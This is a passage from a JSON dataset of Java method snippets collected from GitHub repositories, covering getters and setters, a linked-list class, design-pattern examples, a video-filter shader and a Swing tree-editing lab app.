["public"]}}, {"id": 56757, "method_name": "setName", "class_name": "money_split_data", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/money_split_data.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56758, "method_name": "getMoney", "class_name": "money_split_data", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMoney() {\n        return money;\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/money_split_data.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56759, "method_name": "setMoney", "class_name": "money_split_data", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMoney(String money) {\n        this.money = money;\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/money_split_data.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56760, "method_name": "main", "class_name": "ListNode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]){\n        LinkedList<Integer> linkedList=new LinkedList<>();\n        System.out.println(linkedList.isEmpty());\n\n\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56761, "method_name": "getSize", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSize(){\n        return size;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56762, "method_name": "isEmpty", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEmpty(){\n        return size==0;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56763, "method_name": "add", "class_name": "LinkedList", "params": ["int", "E"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void add(int index,E e){\n        if(index<0||index>size)\n            throw new IllegalArgumentException(\"Add failed.Illegal index.\");\n\n        Node prev=dummyHead;\n        for(int i=0;i<index;i++)\n            prev=prev.next;\n\n        prev.next=new Node(e,prev.next);\n        size++;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56764, "method_name": "addFirst", "class_name": "LinkedList", "params": ["E"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addFirst(E e){\n        add(0, e);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56765, "method_name": "addLast", "class_name": "LinkedList", "params": ["E"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void addLast(E e) {\n        add(size,e);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56766, "method_name": "get", "class_name": "LinkedList", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "E", "snippet": "    public  E get(int index){\n        if(index<0||index>=size)\n            throw new IllegalArgumentException(\"Get failed.Illegal index.\");\n\n        Node cur=dummyHead.next;\n        for(int i=0; i<index;i++)\n            cur=cur.next;\n        return cur.e;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56767, "method_name": "getFirst", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "E", "snippet": "    public E getFirst(){\n        return get(0);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56768, "method_name": "getLast", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "E", "snippet": "    public E getLast(){\n        return get(size-1);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56769, "method_name": "set", "class_name": "LinkedList", "params": ["int", "E"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set(int index,E e){\n        if(index<0||index>=size)\n            throw new IllegalArgumentException(\"Get failed.Illegal index.\");\n        Node cur=dummyHead.next;\n        for(int i=0;i<index;i++)\n            cur=cur.next;\n        cur.e=e;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56770, "method_name": "contains", "class_name": "LinkedList", "params": ["E"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean contains(E e){\n        Node cur=dummyHead.next;\n        while(cur !=null){\n            if(cur.e.equals(e))\n                return true;\n            cur=cur.next;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56771, "method_name": "remove", "class_name": "LinkedList", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "E", "snippet": "    public  E remove(int index){\n        if(index<0||index>=size)\n            throw new IllegalArgumentException(\"Get failed.Illegal index.\");\n        //\u627e\u5230\u8981\u5220\u9664\u7684\u524d\u4e00\u4e2a\u8282\u70b9\n        Node prev=dummyHead;\n        for(int i=0;i<index;i++)\n            prev=prev.next;\n        Node retNode=prev.next;\n        prev.next=retNode.next;\n        retNode.next=null;\n        size--;\n        return retNode.e;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56772, "method_name": "removeFirst", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "E", "snippet": "    public E removeFirst(){\n        return remove(0);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56773, "method_name": "removeLast", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "E", "snippet": "    public E removeLast(){\n        return remove(size-1);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56774, "method_name": "toString", "class_name": "LinkedList", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString(){\n        StringBuilder res=new StringBuilder();\n        //\u4e0e\u4e0b\u9762\u7684\u5199\u6cd5\u7b49\u4ef7\n//     Node cur=dummyHead.next;\n//     while(cur!=null){\n//         res.append(cur+\"->\");\n//         cur=cur.next;\n//     }\n        for(Node cur=dummyHead.next;cur!=null;cur=cur.next)\n            res.append(cur+\"->\");\n        res.append(\"NULL\");\n        return res.toString();\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56775, "method_name": "toString", "class_name": "Node", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString(){\n            return e.toString();\n        }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/DataStructure/List/ListNode.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 56776, "method_name": "addCollege", "class_name": "CollegeAggregateImpl", "params": ["College"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addCollege(College college) {\n        collegeList.add(college);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeAggregateImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["CollegeAggregate"], "modifiers": ["public"]}}, {"id": 56777, "method_name": "removeCollege", "class_name": "CollegeAggregateImpl", "params": ["College"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeCollege(College college) {\n        collegeList.remove(college);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeAggregateImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["CollegeAggregate"], "modifiers": ["public"]}}, {"id": 56778, "method_name": "getIterator", "class_name": "CollegeAggregateImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CollegeIterator", "snippet": "    public CollegeIterator getIterator() {\n        return new CollegeIteratorImpl(collegeList);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeAggregateImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["CollegeAggregate"], "modifiers": ["public"]}}, {"id": 56779, "method_name": "initValues", "class_name": "DocumentaryEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initValues(GLSurfaceView mGlSurfaceView) {\n        mWidth = mGlSurfaceView.getWidth();\n        mHeight = mGlSurfaceView.getHeight();\n        mRandom = new Random(new Date().getTime());\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/DocumentaryEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 56780, "method_name": "getShader", "class_name": "DocumentaryEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n        initValues(mGlSurfaceView);\n        float scale[] = new float[2];\n        if (mWidth > mHeight) {\n            scale[0] = 1f;\n            scale[1] = ((float) mHeight) / mWidth;\n        } else {\n            scale[0] = ((float) mWidth) / mHeight;\n            scale[1] = 1f;\n        }\n        float max_dist = ((float) Math.sqrt(scale[0] * scale[0] + scale[1]\n                * scale[1])) * 0.5f;\n\n        float seed[] = {mRandom.nextFloat(), mRandom.nextFloat()};\n\n        String scaleString[] = new String[2];\n        String seedString[] = new String[2];\n\n        scaleString[0] = \"scale[0] = \" + scale[0] + \";\\n\";\n        scaleString[1] = \"scale[1] = \" + scale[1] + \";\\n\";\n\n        seedString[0] = \"seed[0] = \" + seed[0] + \";\\n\";\n        seedString[1] = \"seed[1] = \" + seed[1] + \";\\n\";\n\n        String inv_max_distString = \"inv_max_dist = \" + 1.0f / max_dist + \";\\n\";\n        String stepsizeString = \"stepsize = \" + 1.0f / 255.0f + \";\\n\";\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \" vec2 seed;\\n\"\n                + \" float stepsize;\\n\"\n                + \" float inv_max_dist;\\n\"\n                + \" vec2 scale;\\n\"\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"float rand(vec2 loc) {\\n\"\n                + \"  float theta1 = dot(loc, vec2(0.9898, 0.233));\\n\"\n                + \"  float theta2 = dot(loc, vec2(12.0, 78.0));\\n\"\n                + \"  float value = cos(theta1) * sin(theta2) + sin(theta1) * cos(theta2);\\n\"\n                +\n                // keep value of part1 in range: (2^-14 to 2^14).\n                \"  float temp = mod(197.0 * value, 1.0) + value;\\n\"\n                + \"  float part1 = mod(220.0 * temp, 1.0) + temp;\\n\"\n                + \"  float part2 = value * 0.5453;\\n\"\n                + \"  float part3 = cos(theta1 + theta2) * 0.43758;\\n\"\n                + \"  return fract(part1 + part2 + part3);\\n\"\n                + \"}\\n\"\n                + \"void main() {\\n\"\n                // Parameters that were created above\n                + scaleString[0]\n                + scaleString[1]\n                + seedString[0]\n                + seedString[1]\n                + inv_max_distString\n                + stepsizeString\n\n                // black white\n                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"  float dither = rand(vTextureCoord + seed);\\n\"\n                + \"  vec3 xform = clamp(2.0 * color.rgb, 0.0, 1.0);\\n\"\n                + \"  vec3 temp = clamp(2.0 * (color.rgb + stepsize), 0.0, 1.0);\\n\"\n                + \"  vec3 new_color = clamp(xform + (temp - xform) * (dither - 0.5), 0.0, 1.0);\\n\"\n                +\n                // grayscale\n                \"  float gray = dot(new_color, vec3(0.299, 0.587, 0.114));\\n\"\n                + \"  new_color = vec3(gray, gray, gray);\\n\"\n                +\n                // vignette\n                \"  vec2 coord = vTextureCoord - vec2(0.5, 0.5);\\n\"\n                + \"  float dist = length(coord * scale);\\n\"\n                + \"  float lumen = 0.85 / (1.0 + exp((dist * inv_max_dist - 0.83) * 20.0)) + 0.15;\\n\"\n                + \"  gl_FragColor = vec4(new_color * lumen, color.a);\\n\"\n                + \"}\\n\";\n\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/DocumentaryEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 56781, "method_name": "buildCPU", "class_name": "ComputerBuilder", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void buildCPU(String CPU);\n\n    public abstract void buildMotherboard(String motherboard);\n\n    public abstract void buildRAM(String RAM);\n\n    public abstract void buildGPU(String GPU);\n\n    public abstract void buildMonitor(String monitor);\n\n    //\u7ec4\u88c5\u7535\u8111\n    public abstract Computer AssembleComputer();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56782, "method_name": "buildMotherboard", "class_name": "ComputerBuilder", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void buildMotherboard(String motherboard);\n\n    public abstract void buildRAM(String RAM);\n\n    public abstract void buildGPU(String GPU);\n\n    public abstract void buildMonitor(String monitor);\n\n    //\u7ec4\u88c5\u7535\u8111\n    public abstract Computer AssembleComputer();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56783, "method_name": "buildRAM", "class_name": "ComputerBuilder", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void buildRAM(String RAM);\n\n    public abstract void buildGPU(String GPU);\n\n    public abstract void buildMonitor(String monitor);\n\n    //\u7ec4\u88c5\u7535\u8111\n    public abstract Computer AssembleComputer();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56784, "method_name": "buildGPU", "class_name": "ComputerBuilder", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void buildGPU(String GPU);\n\n    public abstract void buildMonitor(String monitor);\n\n    //\u7ec4\u88c5\u7535\u8111\n    public abstract Computer AssembleComputer();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56785, "method_name": "buildMonitor", "class_name": "ComputerBuilder", "params": ["String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void buildMonitor(String monitor);\n\n    //\u7ec4\u88c5\u7535\u8111\n    public abstract Computer AssembleComputer();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56786, "method_name": "AssembleComputer", "class_name": "ComputerBuilder", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Computer", "snippet": "    public abstract Computer AssembleComputer();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/builder/ComputerBuilder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56787, "method_name": "getServiceRetrofit", "class_name": "BaseRetrofit2Service", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Retrofit", "snippet": "    protected Retrofit getServiceRetrofit() {\n        return serviceRetrofit;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/V2/Services/Retrofit2Services/BaseRetrofit2Service.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56788, "method_name": "should_be_on_page", "class_name": "AssertionSteps", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void should_be_on_page(String object, String expected, String pagename) {\n        BasePage basePage = PageObjects.getPageObject(pagename);\n        // BasePage basePage = new Dashboard();\n        basePage.validateResult(object, expected);\n    }", "url": "https://raw.githubusercontent.com/Skarlet03/office_hour_cucumber_project/master/src/main/java/automationPractice/step_definitions/AssertionSteps.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56789, "method_name": "onTreeViewClick", "class_name": "MainGui", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTreeViewClick(MouseEvent e) {\n        if (e.getClickCount() != 1 || e.getButton() != MouseEvent.BUTTON2)\n            return;\n\n        DefaultMutableTreeNode node = getSelectedNode();\n        if (node == null)\n            return;\n\n        AnyData data = (AnyData) node.getUserObject();\n        Dlg dlg = data.showDialog(false);\n        dlg.dispose();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56790, "method_name": "onAddAction", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAddAction(ActionEvent e) {\n        final DefaultMutableTreeNode parent = getSelectedNode();\n        if (parent == null)\n            return;\n\n        AnyData parentData = (AnyData) parent.getUserObject();\n        Dlg dlg = parentData.showSonDialog();\n        if (dlg == null)\n            return;\n\n        AnyData newData;\n        try {\n            newData = dlg.createData();\n        } catch (Exception ex) {\n            JOptionPane.showMessageDialog(viewTree, ex.getMessage(), \"Error\", JOptionPane.ERROR_MESSAGE);\n            return;\n        }\n\n        dlg.dispose();\n        if (newData == null)\n            return;\n\n        final DefaultMutableTreeNode newSon = new DefaultMutableTreeNode(newData);\n        parent.add(newSon);\n        viewTree.updateUI();\n\n        expandAll();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56791, "method_name": "onRemoveAction", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRemoveAction(ActionEvent e) {\n        final DefaultMutableTreeNode node = getSelectedNode();\n        if (node == null)\n            return;\n\n        node.removeFromParent();\n\n        viewTree.setSelectionPath(null);\n        viewTree.updateUI();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56792, "method_name": "onEditAction", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEditAction(ActionEvent e) {\n        final DefaultMutableTreeNode node = getSelectedNode();\n        if (node == null)\n            return;\n\n        AnyData data = (AnyData) node.getUserObject();\n        Dlg dlg = data.showDialog(true);\n\n        AnyData editData;\n        try {\n            editData = dlg.createData();\n        } catch (Exception ex) {\n            JOptionPane.showMessageDialog(viewTree, ex.getMessage(), \"Error\", JOptionPane.ERROR_MESSAGE);\n            return;\n        }\n\n        dlg.dispose();\n        if (editData == null)\n            return;\n\n        node.setUserObject(editData);\n        viewTree.updateUI();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56793, "method_name": "onStoreAction", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStoreAction(ActionEvent e) {\n        final TreeModel model = viewTree.getModel();\n\n        // Check for tree empty.\n        if (model == null || model.getRoot() == null) {\n            JOptionPane.showMessageDialog(\n                    this,\n                    \"Tree is empty.\\n\" +\n                            \"To store tree, you must fill it at first.\",\n                    \"Error\",\n                    JOptionPane.ERROR_MESSAGE\n            );\n            return;\n        }\n\n        // Forming file chooser gui.\n        final JFileChooser fileChooser = new JFileChooser();\n        fileChooser.setDialogTitle(\"Select file to save\");\n        fileChooser.setApproveButtonText(\"Save\");\n        fileChooser.setFileFilter(new FileFilter() {\n            @Override\n            public boolean accept(File f) {\n                return !f.isDirectory() && f.getName().endsWith(\".bin\");\n            }\n\n            @Override\n            public String getDescription() {\n                return \"Wood storage data - .wood\";\n            }\n        });\n\n        fileChooser.setMultiSelectionEnabled(false);\n        final int selection = fileChooser.showSaveDialog(this);\n        if (selection != JFileChooser.APPROVE_OPTION)\n            return;\n\n        // Extract selected file with spell check.\n        File selectedFile = fileChooser.getSelectedFile();\n        if (!selectedFile.getName().endsWith(\".bin\"))\n            selectedFile = new File(selectedFile.getAbsolutePath(), selectedFile.getName() + \".bin\");\n\n        // Writing current tree model to file.\n        try (ObjectOutputStream stream = new ObjectOutputStream(new FileOutputStream(selectedFile))) {\n            stream.writeObject(viewTree.getModel());\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56794, "method_name": "onRestoreAction", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRestoreAction(ActionEvent e) {\n        // Forming file chooser gui.\n        final JFileChooser fileChooser = new JFileChooser();\n        fileChooser.setDialogTitle(\"Select file to open.\");\n        fileChooser.setApproveButtonText(\"Open\");\n        fileChooser.setFileFilter(new FileFilter() {\n            @Override\n            public boolean accept(File f) {\n                return !f.isDirectory() && f.getName().endsWith(\".bin\");\n            }\n\n            @Override\n            public String getDescription() {\n                return \"Binary Data - .bin\";\n            }\n        });\n\n        fileChooser.setMultiSelectionEnabled(false);\n        final int selection = fileChooser.showOpenDialog(this);\n        if (selection != JFileChooser.APPROVE_OPTION)\n            return;\n\n        // Getting user selected file.\n        final File selectedFile = fileChooser.getSelectedFile();\n\n        // Writes data to file.\n        try (ObjectInputStream stream = new ObjectInputStream(new FileInputStream(selectedFile))) {\n            viewTree.setModel((TreeModel) stream.readObject());\n        } catch (IOException | ClassCastException | ClassNotFoundException ex) {\n            JOptionPane.showMessageDialog(\n                    this,\n                    \"The bad format of store.\\n\" + ex.getMessage(),\n                    \"Error\",\n                    JOptionPane.ERROR_MESSAGE\n            );\n            ex.printStackTrace();\n            return;\n        }\n\n        expandAll();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56795, "method_name": "onBiggestRegionByPopulation", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBiggestRegionByPopulation(ActionEvent e) {\n        final TreeModel model = viewTree.getModel();\n        final Object root = model.getRoot();\n\n        int maxPopulation = 0;\n        DefaultMutableTreeNode max = null;\n\n        // Iterates over regions\n        final int regionCount = model.getChildCount(root);\n        for (int i = 0; i < regionCount; i++) {\n            final Object regionNode = model.getChild(root, i);\n            int population = 0;\n\n            // Iterates over districts\n            final int districtCount = model.getChildCount(regionNode);\n            for (int j = 0; j < districtCount; j++) {\n                final Object districtNode = model.getChild(regionNode, j);\n\n                // Iterates over cities\n                final int cityCount = model.getChildCount(districtNode);\n                for (int k = 0; k < cityCount; k++) {\n                    final DefaultMutableTreeNode cityNode = (DefaultMutableTreeNode) model.getChild(districtNode, k);\n                    final City city = (City) cityNode.getUserObject();\n                    population += city.getPopulation();\n                }\n            }\n\n            if (population >= maxPopulation) {\n                maxPopulation = population;\n                max = (DefaultMutableTreeNode) regionNode;\n            }\n        }\n\n        if (max == null) {\n            JOptionPane.showMessageDialog(viewTree, \"Nothing found!\", \"Error\", JOptionPane.ERROR_MESSAGE);\n            return;\n        }\n\n        selectNode(max);\n        ((AnyData) max.getUserObject()).showDialog(false);\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56796, "method_name": "onDistrictByMostVillageCouncils", "class_name": "MainGui", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDistrictByMostVillageCouncils(ActionEvent e) {\n        DefaultMutableTreeNode node = getSelectedNode();\n        if (node == null)\n            return;\n\n        int maxCouncils = 0;\n        DefaultMutableTreeNode max = null;\n\n        Enumeration<TreeNode> enm = node.postorderEnumeration();\n        while (enm.hasMoreElements()) {\n            final DefaultMutableTreeNode current = (DefaultMutableTreeNode) enm.nextElement();\n            final Object data = current.getUserObject();\n            if (!(data instanceof District))\n                continue;\n\n            int councils = ((District) data).getVillageCouncils();\n            if (councils > maxCouncils) {\n                maxCouncils = councils;\n                max = current;\n            }\n        }\n\n        if (max == null) {\n            JOptionPane.showMessageDialog(viewTree, \"Nothing found!\", \"Error\", JOptionPane.ERROR_MESSAGE);\n            return;\n        }\n\n        selectNode(max);\n        ((AnyData) max.getUserObject()).showDialog(false);\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56797, "method_name": "getDefaultTreeModel", "class_name": "MainGui", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TreeModel", "snippet": "    public TreeModel getDefaultTreeModel() {\n        final Country country = new Country(\"\u0423\u043a\u0440\u0430\u0457\u043d\u0430\", \"\u0417\u0435\u043b\u0435\u043d\u0441\u044c\u043a\u0438\u0439 \u0412\u043e\u043b\u043e\u0434\u0438\u043c\u0438\u0440 \u041e\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u043e\u0432\u0438\u0447\", \"\u041a\u0438\u0457\u0432\");\n        final Region region = new Region(\"\u0427\u0435\u0440\u043d\u0456\u0433\u0456\u0432\u0441\u044c\u043a\u0430 \u043e\u0431\u043b\u0430\u0441\u0442\u044c\", \"\u0410\u043d\u0434\u0440\u0456\u0439 \u041b\u0435\u043e\u043d\u0456\u0434\u043e\u0432\u0438\u0447 \u041f\u0440\u043e\u043a\u043e\u043f\u0435\u043d\u043a\u043e\", 31_903, \"\u0427\u0435\u0440\u043d\u0456\u0433\u043e\u0432\");\n        final District district = new District(\"\u0427\u0435\u0440\u043d\u0456\u0433\u0456\u0432\u0441\u044c\u043a\u0438\u0439 \u0440\u0430\u0439\u043e\u043d\", 46, \"\u0427\u0435\u0440\u043d\u0456\u0433\u0456\u0432\");\n        final City city = new City(\"\u0427\u0435\u0440\u043d\u0456\u0433\u0456\u0432\", 286_899, \"\u0412\u043b\u0430\u0434\u0438\u0441\u043b\u0430\u0432 \u0410\u043d\u0430\u0442\u043e\u043b\u0456\u0439\u043e\u0432\u0438\u0447 \u0410\u0442\u0440\u043e\u0448\u0435\u043d\u043a\u043e\");\n\n        final DefaultMutableTreeNode countryNode = new DefaultMutableTreeNode(country);\n        final DefaultMutableTreeNode regionNode = new DefaultMutableTreeNode(region);\n        final DefaultMutableTreeNode districtNode = new DefaultMutableTreeNode(district);\n        final DefaultMutableTreeNode 